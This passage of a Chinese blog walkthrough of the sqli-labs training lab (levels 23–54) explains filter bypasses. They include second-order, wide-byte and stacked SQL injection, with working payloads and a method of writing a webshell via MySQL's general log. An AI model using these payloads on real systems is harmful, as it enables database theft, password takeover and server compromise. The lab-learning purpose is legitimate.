<h4 id="3-3-3-Less-23"><a href="#3-3-3-Less-23" class="headerlink" title="3.3.3 Less-23"></a>3.3.3 Less-23</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">"/#/"</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">"/--/"</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">""</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="string">"查询结果"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p>过滤了注释符，可以使用闭合方式。</p>
<h4 id="3-3-4-Less-24"><a href="#3-3-4-Less-24" class="headerlink" title="3.3.4 Less-24"></a>3.3.4 Less-24</h4><p><code>login_create.php</code></p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>=  <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'username'</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'password'</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'re_password'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select count(*) from users where username='<span class="subst">$username</span>'"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">"insert into users ( username, password) values(\"<span class="subst">$username</span>\", \"<span class="subst">$pass</span>\")"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p><code>login.php</code></p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">"login_user"</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">"login_password"</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT * FROM users WHERE username='<span class="subst">$username</span>' and password='<span class="subst">$password</span>'"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p><code>pass_change.php</code></p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">"username"</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'current_password'</span>]);</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'password'</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">'re_password'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"UPDATE users SET PASSWORD='<span class="subst">$pass</span>' where username='<span class="subst">$username</span>' and password='<span class="subst">$curr_pass</span>' "</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>这里大部分都被转义了，唯一可利用的地方在最后的<code>update</code>语句中的<code>username</code>，这里需要利用二次注入，即将构造的sql语句插入数据库中，在其被调用时触发。</p>
<p>比如数据库有<code>username</code>值为<code>admin'#</code>，被拼接进<code>update</code>语句就会变成：</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">'$pass'</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">'admin'</span>#<span class="string">' and password='</span>$curr_pass<span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>

<p>那么就直接修改了<code>admin</code>用户的密码。</p>
<p>先注册一个名为<code>admin'#</code>的用户</p>
<img src="/posts/31899/image-20250310232549937.png" class="" title="image-20250310232549937">

<p>然后登录后修改密码</p>
<img src="/posts/31899/image-20250310232652649.png" class="" title="image-20250310232652649">

<p>查看数据库发现<code>admin</code>用户密码被成功修改了</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> * from security.users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| <span class="built_in">id</span> | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | 1234       |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">| 15 | admin<span class="string">'#  | 123        |</span></span><br><span class="line"><span class="string">+----+----------+------------+</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="3-3-5-Less-25"><a href="#3-3-5-Less-25" class="headerlink" title="3.3.5 Less-25"></a>3.3.5 Less-25</h4><p>接下来很多是绕过过滤的，所以只考虑绕过过滤的部分。</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/or/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);    </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/AND/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>双写绕过<code>oorr</code>，符号替换<code>or</code>换成<code>||</code>。</p>
<h4 id="3-3-6-Less-25a"><a href="#3-3-6-Less-25a" class="headerlink" title="3.3.6 Less-25a"></a>3.3.6 Less-25a</h4><p>无区别。</p>
<h4 id="3-3-7-Less-26"><a href="#3-3-7-Less-26" class="headerlink" title="3.3.7 Less-26"></a>3.3.7 Less-26</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/or/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);           </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/and/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);     </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);     </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[--]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);    </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[#]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);       </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);     </span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);    </span><br></pre></td></tr></tbody></table></figure>

<p><code>or</code>和<code>and</code>使用双写或者<code>||``&amp;&amp;</code>替换。</p>
<p>过滤注释使用闭合绕过。</p>
<p>空格字符绕过</p>
<p><code>%a0</code>：空格</p>
<p><code>%09</code>：TAB键（水平）</p>
<p><code>%0a</code>：新建一行</p>
<p><code>%0c</code>：新的一页</p>
<p><code>%0d</code>：return功能</p>
<p><code>%0b</code>：TAB键（垂直）</p>
<p><code>%00</code>：空字符</p>
<h4 id="3-3-8-Less-26a"><a href="#3-3-8-Less-26a" class="headerlink" title="3.3.8 Less-26a"></a>3.3.8 Less-26a</h4><p>无区别。</p>
<h4 id="3-3-9-Less-27"><a href="#3-3-9-Less-27" class="headerlink" title="3.3.9 Less-27"></a>3.3.9 Less-27</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[--]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[#]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/select/m'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/select/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/Select/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/union/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/Union/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></tbody></table></figure>

<p><code>select</code>和<code>union</code>使用大小写绕过和嵌套绕过即可。</p>
<h4 id="3-3-10-Less-27a"><a href="#3-3-10-Less-27a" class="headerlink" title="3.3.10 Less-27a"></a>3.3.10 Less-27a</h4><p>无区别。</p>
<h4 id="3-3-11-Less-28"><a href="#3-3-11-Less-28" class="headerlink" title="3.3.11 Less-28"></a>3.3.11 Less-28</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[--]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[#]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);.</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>不能大小写绕过，嵌套绕过即可。</p>
<h4 id="3-3-12-Less-28a"><a href="#3-3-12-Less-28a" class="headerlink" title="3.3.12 Less-28a"></a>3.3.12 Less-28a</h4><p>无区别。</p>
<h4 id="3-3-13-Less-29"><a href="#3-3-13-Less-29" class="headerlink" title="3.3.13 Less-29"></a>3.3.13 Less-29</h4><p>这里主要难点在<code>login.php</code>而不是<code>index.php</code>中。</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//提取id</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= <span class="title function_ invoke__">explode</span>(<span class="string">"&amp;"</span>,<span class="variable">$q_s</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	{</span><br><span class="line">		<span class="variable">$val</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">"id"</span>)</span><br><span class="line">		{</span><br><span class="line">			<span class="variable">$id_value</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"><span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="variable">$hint</span>=<span class="variable">$qs</span>;</span><br><span class="line"><span class="variable">$id1</span>=<span class="title function_ invoke__">java_implimentation</span>(<span class="variable">$qs</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//id只能为数字</span></span><br><span class="line"><span class="title function_ invoke__">whitelist</span>(<span class="variable">$id1</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>这里可以构造两个<code>id</code>，因为<code>java_implimentation()</code>函数只会拿到第一个<code>id</code>去检测，从而使得后面<code>id</code>绕过检测。</p>
<p>这里根据语言特性绕过可以看本文前面部分。</p>
<h4 id="3-3-14-Less-30"><a href="#3-3-14-Less-30" class="headerlink" title="3.3.14 Less-30"></a>3.3.14 Less-30</h4><p>没区别。</p>
<h4 id="3-3-15-Less-31"><a href="#3-3-15-Less-31" class="headerlink" title="3.3.15 Less-31"></a>3.3.15 Less-31</h4><p>没区别。</p>
<h4 id="3-3-16-Less-32"><a href="#3-3-16-Less-32" class="headerlink" title="3.3.16 Less-32"></a>3.3.16 Less-32</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/'</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, <span class="variable">$string</span>);  </span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, <span class="variable">$string</span>);</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, <span class="variable">$string</span>);      </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">check_addslashes</span>(<span class="variable">$_GET</span>[<span class="string">'id'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>宽字节注入，<code>%df%5c</code>被当做一个汉字，使得<code>'</code>逃逸。</p>
<p>使用<code>\</code>转义<code>\</code>，如<code>\\'</code>，第二个<code>\</code>被转义，使<code>'</code>出来。</p>
<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>'</code> 转为 utf-16 为<code>�</code></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> \'|iconv -f utf-8 -t utf-16</span><br><span class="line">��<span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p>这里我的理解是，�在URL编码后为<code>%EF%BF%BD</code>，MySQL 在使用 GBK 编码的时候，<code>%EF%BF</code>被当做一个汉字，<code>%BD</code>与<code>%5c</code>也就是<code>\</code>被当做一个汉字，因此单引号逃逸出来。</p>
</blockquote>
<p>可以让<code>'</code>逃逸出来</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>�<span class="string">'or 1%23</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250311002549978.png" class="" title="image-20250311002549978">

<h4 id="3-3-17-Less-33"><a href="#3-3-17-Less-33" class="headerlink" title="3.3.17 Less-33"></a>3.3.17 Less-33</h4><p>没区别。</p>
<h4 id="3-3-18-Less-34"><a href="#3-3-18-Less-34" class="headerlink" title="3.3.18 Less-34"></a>3.3.18 Less-34</h4><p>没区别。</p>
<h4 id="3-3-19-Less-35"><a href="#3-3-19-Less-35" class="headerlink" title="3.3.19 Less-35"></a>3.3.19 Less-35</h4><p>没区别。</p>
<h4 id="3-3-20-Less-36"><a href="#3-3-20-Less-36" class="headerlink" title="3.3.20 Less-36"></a>3.3.20 Less-36</h4><p>没区别</p>
<h4 id="3-3-21-Less-37"><a href="#3-3-21-Less-37" class="headerlink" title="3.3.21 Less-37"></a>3.3.21 Less-37</h4><p>没区别。</p>
<h3 id="3-4-Less-38-53"><a href="#3-4-Less-38-53" class="headerlink" title="3.4 Less-38-53"></a>3.4 Less-38-53</h3><blockquote>
<p>下面无特殊利用的就当做无区别了。</p>
</blockquote>
<h4 id="3-4-1-Less-38"><a href="#3-4-1-Less-38" class="headerlink" title="3.4.1 Less-38"></a>3.4.1 Less-38</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)):</span><br><span class="line">    <span class="string">"查询结果"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br></pre></td></tr></tbody></table></figure>

<p>产生堆叠的原因在于<code>mysqli_multi_query()</code>函数，它会执行一个或用分号隔开的多个SQL语句。</p>
<p>堆叠注入可以直接写马GetShell。</p>
<p>这里先查看mysql配置</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">'general%'</span>;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | OFF                             |</span><br><span class="line">| general_log_file | /var/lib/mysql/e783195a8830.<span class="built_in">log</span> |</span><br><span class="line">+------------------+---------------------------------+</span><br></pre></td></tr></tbody></table></figure>

<p>可以看见默认没有开启，首先手动开启。</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">';set global general_log="ON";set global general_log_file='</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>Less<span class="number">-38</span><span class="operator">/</span>shell.php<span class="string">'%23</span></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">'general%'</span>;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | ON                              |</span><br><span class="line">| general_log_file | /var/www/html/Less-38/shell.php |</span><br><span class="line">+------------------+---------------------------------+</span><br></pre></td></tr></tbody></table></figure>

<p>然后就可以写入php代码了</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">';select '</span><span class="operator">&lt;</span>?php phpinfo();?<span class="operator">&gt;</span><span class="string">'%23</span></span><br></pre></td></tr></tbody></table></figure>

<p>查看文件</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /var/www/html/Less-38/shell.php</span><br><span class="line">250311 14:32:51    10 Connect   root@localhost on security</span><br><span class="line">                   10 Init DB   security</span><br><span class="line">                   10 Query     SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=<span class="string">'1'</span>;<span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span>#<span class="string">' LIMIT 0,1</span></span><br></pre></td></tr></tbody></table></figure>

<p>成功写入，但是可能是权限的问题，没有成功执行。</p>
<h4 id="3-4-2-Less-39"><a href="#3-4-2-Less-39" class="headerlink" title="3.4.2 Less-39"></a>3.4.2 Less-39</h4><p>无区别</p>
<h4 id="3-4-3-Less-40"><a href="#3-4-3-Less-40" class="headerlink" title="3.4.3 Less-40"></a>3.4.3 Less-40</h4><p>无区别</p>
<h4 id="3-4-4-Less-41"><a href="#3-4-4-Less-41" class="headerlink" title="3.4.4 Less-41"></a>3.4.4 Less-41</h4><p>无区别</p>
<h4 id="3-4-5-Less-42"><a href="#3-4-5-Less-42" class="headerlink" title="3.4.5 Less-42"></a>3.4.5 Less-42</h4><p>类似于<code>Less-24</code>，少了一些过滤。</p>
<h4 id="3-4-6-Less-43"><a href="#3-4-6-Less-43" class="headerlink" title="3.4.6 Less-43"></a>3.4.6 Less-43</h4><p>无区别。</p>
<h4 id="3-4-7-Less-44"><a href="#3-4-7-Less-44" class="headerlink" title="3.4.7 Less-44"></a>3.4.7 Less-44</h4><p>无区别。</p>
<h4 id="3-4-8-Less-45"><a href="#3-4-8-Less-45" class="headerlink" title="3.4.8 Less-45"></a>3.4.8 Less-45</h4><p>无区别。</p>
<h4 id="3-4-9-Less-46"><a href="#3-4-9-Less-46" class="headerlink" title="3.4.9 Less-46"></a>3.4.9 Less-46</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'sort'</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT * FROM users ORDER BY <span class="subst">$id</span>"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">    <span class="string">"查询结果"</span></span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>

<p><code>order by</code>注入，具体看本文order by注入部分。</p>
<h4 id="3-4-10-Less-47"><a href="#3-4-10-Less-47" class="headerlink" title="3.4.10 Less-47"></a>3.4.10 Less-47</h4><p>无区别。</p>
<h4 id="3-4-11-Less-48"><a href="#3-4-11-Less-48" class="headerlink" title="3.4.11 Less-48"></a>3.4.11 Less-48</h4><p>无区别。</p>
<h4 id="3-4-12-Less-49"><a href="#3-4-12-Less-49" class="headerlink" title="3.4.12 Less-49"></a>3.4.12 Less-49</h4><p>无区别。</p>
<h4 id="3-4-13-Less-50"><a href="#3-4-13-Less-50" class="headerlink" title="3.4.13 Less-50"></a>3.4.13 Less-50</h4><p>无区别。</p>
<h4 id="3-4-14-Less-51"><a href="#3-4-14-Less-51" class="headerlink" title="3.4.14 Less-51"></a>3.4.14 Less-51</h4><p>无区别。</p>
<h4 id="3-4-15-Less-52"><a href="#3-4-15-Less-52" class="headerlink" title="3.4.15 Less-52"></a>3.4.15 Less-52</h4><p>无区别。</p>
<h4 id="3-4-16-Less-53"><a href="#3-4-16-Less-53" class="headerlink" title="3.4.16 Less-53"></a>3.4.16 Less-53</h4><p>无区别。</p>
<h3 id="3-5-Less54-65"><a href="#3-5-Less54-65" class="headerlink" title="3.5 Less54-65"></a>3.5 Less54-65</h3><h4 id="3-5-1-Less-54"><a href="#3-5-1-Less-54" class="headerlink" title="3.5.1 Less-54"></a>3.5.1 Less-54</h4><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$times</span>= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'reset'</span>]))</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">'challenge'</span>, <span class="string">' '</span>, <span class="title function_ invoke__">time</span>() - <span class="number">3600000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">'challenge'</span>]))</span><br><span class="line">        <span class="variable">$sessid</span>=<span class="variable">$_COOKIE</span>[<span class="string">'challenge'</span>];</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="variable">$expire</span> = <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">        <span class="variable">$hash</span> = <span class="title function_ invoke__">data</span>(<span class="variable">$table</span>,<span class="variable">$col</span>);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">"challenge"</span>, <span class="variable">$hash</span>, <span class="variable">$expire</span>);</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">$_GET</span>[<span class="string">'id'</span>]:</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">"SELECT * FROM security.users WHERE id='<span class="subst">$id</span>' LIMIT 0,1"</span>;</span><br><span class="line">    <span class="keyword">if</span> <span class="literal">true</span></span><br><span class="line">        <span class="string">"查询结果"</span></span><br><span class="line">    <span class="keyword">else</span>：</span><br><span class="line">       </span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">'key'</span>]);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT 1 FROM <span class="subst">$table</span> WHERE <span class="subst">$col1</span>= '<span class="subst">$key</span>'"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>十次以内查出结果</p>
<p>判断闭合</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'</span></span><br><span class="line"><span class="string">?id=1'</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></tbody></table></figure>

<p>判断字段数</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'order by 3%23</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></tbody></table></figure>

<p>查数据库名</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">'union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23</span></span><br><span class="line"><span class="string">information_schema,challenges,mysql,performance_schema,security</span></span><br></pre></td></tr></tbody></table></figure>

<p>查表名</p>
